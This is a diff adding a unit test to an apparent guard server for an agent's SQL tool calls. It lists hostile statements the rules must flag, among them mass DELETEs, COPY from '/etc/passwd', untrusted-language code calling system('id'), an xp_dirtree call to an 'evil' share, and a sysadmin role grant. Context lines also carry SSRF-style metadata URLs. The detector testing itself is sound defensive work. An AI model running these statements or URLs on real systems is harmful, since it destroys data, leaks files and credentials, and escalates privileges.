@@ -2870,6 +2870,30 @@ class PackReading(unittest.TestCase):
         d = self.server.decide("run_sql", {"sql": "SELECT 'unclosed; DROP TABLE users"})
         self.assertEqual((d["verdict"], d["rule_ids"]), ("ask", ["TK-SQL-PARSE"]))
 
+    def test_constant_conditions_server_files_untrusted_languages_and_sql_servers_roles(self):
+        """The 1.5.3 sweep: a DELETE whose WHERE was constant in another form, MySQL's DELETE t FROM t, COPY of a
+        server file, an untrusted procedural language, SQL Server's bulk reads, xp_dirtree and server roles passed."""
+        def sql(rule, statements, want=True):
+            self.rule_on_server(rule, [("run_sql", {"sql": s}) for s in statements], want)
+        sql("TK-DB003", ("DELETE FROM users WHERE (1=1)", "DELETE FROM users WHERE 0=0", "DELETE FROM users WHERE 2>1",
+                         "DELETE FROM users WHERE TRUE OR id=5", "DELETE FROM users WHERE NOT FALSE",
+                         "DELETE users FROM users", "DELETE FROM users WHERE id = 5 OR 1=1", "DELETE IGNORE FROM users"))
+        sql("TK-DB005", ("COPY t FROM '/etc/passwd'", "COPY (SELECT 1) TO '/tmp/x'", "SELECT 1; COPY t TO '/tmp/x'",
+                         "CREATE FUNCTION f() RETURNS int AS $$ import os; return 1 $$ LANGUAGE plpython3u",
+                         "DO $$ system('id') $$ LANGUAGE plperlu", "CREATE EXTENSION IF NOT EXISTS plpython3u",
+                         "SELECT * FROM OPENROWSET(BULK 'C:\\x.txt', SINGLE_CLOB) AS r", "BULK INSERT t FROM 'C:\\x.csv'",
+                         "EXEC xp_dirtree '\\\\evil\\share'"))
+        sql("TK-DB004", ("EXEC sp_addsrvrolemember 'agent', 'sysadmin'", "ALTER SERVER ROLE sysadmin ADD MEMBER agent"))
+        # a scoped WHERE, a constant inside a subquery or parentheses, a join, a client-side COPY and a trusted language
+        sql("TK-DB003", ("DELETE FROM users WHERE 1=1 AND id = 5", "DELETE FROM t WHERE id IN (SELECT id FROM u WHERE 1=1)",
+                         "DELETE FROM t WHERE id IN (SELECT id FROM u WHERE 1=1 OR z = 2)",
+                         "DELETE FROM t WHERE a = 1 AND (b = 2 OR 1=1)", "DELETE FROM t WHERE (1=1 OR x = 2) AND y = 3",
+                         "DELETE t1 FROM t1 JOIN t2 ON t1.id = t2.id", "DELETE FROM t WHERE 1=1 LIMIT 10"), want=False)
+        sql("TK-DB005", ("COPY t FROM STDIN WITH (FORMAT csv, DELIMITER ',')", "COPY t TO STDOUT WITH (NULL '')",
+                         "\\copy t FROM 'local.csv' CSV", "SET search_path TO 'app'", "SELECT * FROM 'users'",
+                         "CREATE FUNCTION f() RETURNS int AS $$ SELECT 1 $$ LANGUAGE sql", "CREATE EXTENSION pg_trgm",
+                         "SELECT bulk_id FROM orders"), want=False)
+
     def test_hosts_are_normalised_before_matching(self):
         urls = ("http://127.0.0.1\\@evil.com/", "http://169.16689662/latest/meta-data/", "http://[0:0:0:0:0:ffff:a9fe:a9fe]/",
                 "http://[0:0::1]/", "http://2130706433/", "http://0177.0.0.1/", "http://metadata/computeMetadata/v1/",
